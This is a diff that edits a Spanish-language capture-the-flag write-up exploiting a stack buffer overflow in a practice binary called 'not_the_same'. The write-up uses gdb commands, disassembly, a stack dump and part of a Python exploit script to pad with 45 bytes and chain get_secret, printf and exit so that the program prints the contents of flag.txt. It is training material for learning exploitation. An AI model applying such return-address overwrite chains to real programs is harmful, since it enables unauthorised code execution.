@@ -53,11 +53,11 @@ gdb.MemoryError: Cannot access memory at address 0x41356241
 python -c "print 'A'*45"
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    
-- Apuntas a la funcion get_secret en $esp
+- Apuntas a la funcion get_secret en $esp:
 set {int}0xbffff34c = 0x080489a0 (siendo 0xbffff34c el valor de $esp, cambiar si no coincide)
 
 - Pones un breakpoint en get_secret *0x080489de, después de haber cargado el valor del fichero flag.txt en la posición de memoria fl4g:
-disas get_secret
+disas get_secret:
 Dump of assembler code for function get_secret:
    0x080489a0 <+0>:	push   esi
    0x080489a1 <+1>:	sub    esp,0x18
@@ -76,9 +76,9 @@ Dump of assembler code for function get_secret:
    0x080489de <+62>:	ret    
 End of assembler dump.
 
-0x80eca2d <fl4g>:	0x65757250	0x000a6162	0x00000000	0x00000000
+0x80eca2d <fl4g>:	0x67616c46	0x65766e49	0x6461746e	0x00000a6f
 
-- Llamas al printf y pasas la dirección de fl4g 
+- Llamas al printf y pasas la dirección de fl4g:
 set {int}0xbffff350 = 0x0804f0a0 --> Llamada a printf
 set {int}0xbffff354 = 0x0804e660 --> Aquí podría ponerse la llamada a la función exit para que sea más elegante (0x0804e660)
 set {int}0xbffff358 = 0x080eca2d --> Dirección de fl4g
@@ -106,22 +106,22 @@ Dump of assembler code for function exit:
    0x0804e670 <+16>:	call   0x804e540 <__run_exit_handlers>
 End of assembler dump.
 
+- En la pila tiene que quedar algo como esto antes de llamar al ret de get_secret:
+>>> x/32xw $esp-16
+0xbffff340:	0x41414141	0x41414141	0x41414141	0x080eb00c
+0xbffff350:	0x0804f0a0	0x0804e660	0x080eca2d	0xbffff374
+0xbffff360:	0x00000000	0x00000001	0xbffff404	0x080489e0
+0xbffff370:	0x00000000	0x0804818c	0x080eb00c	0x49656e69
 	
-- Python final para explotar
-El payload quedaría así gráficamente:
-
+- El payload quedaría así gráficamente:
 |45*A		|
 |get_secret	|
 |printf		|
 |exit		|
 |addr_fl4g	|
--------------
+|_______________|
 
-Se prueba con
-python pwn_not_the_same.py > file.txt
-./not_the_same < file.txt
-
-
+- Archivo final para explotar:
 #!/usr/bin/env python
 # Archivo pwn_not_the_same.py
 
@@ -139,6 +139,9 @@ print buf+retn1+retn2+retn3+retn4
 
 # Fin fichero pwn_not_the_same
 
+- Se prueba con:
+python pwn_not_the_same.py > file.txt
+./not_the_same < file.txt
 
 - Notas varias
 
